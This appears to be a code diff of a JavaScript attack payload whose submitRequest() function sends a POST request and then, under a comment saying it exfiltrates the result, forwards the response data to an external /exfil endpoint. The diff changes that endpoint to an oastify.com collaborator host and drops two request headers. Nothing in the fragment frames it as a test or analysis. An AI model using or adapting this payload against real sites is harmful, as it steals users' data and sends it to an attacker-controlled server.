@@ -5,8 +5,6 @@ function submitRequest() {
   fetch(url, {
     method: "POST",
     headers: {
-      "Accept": "application/json, text/plain, */*",
-      "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
       "Content-Type": "application/json"
     },
     body: body,
@@ -23,7 +21,7 @@ function submitRequest() {
     console.log("Response data:", data);
 
     // Exfiltrate the result to a remote server
-    fetch("https://bhx6fqq7.c5.rs/exfil", {
+    fetch("https://1z1f5krsnflbw7918qzikh2bs2ytmmab.oastify.com/exfil", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
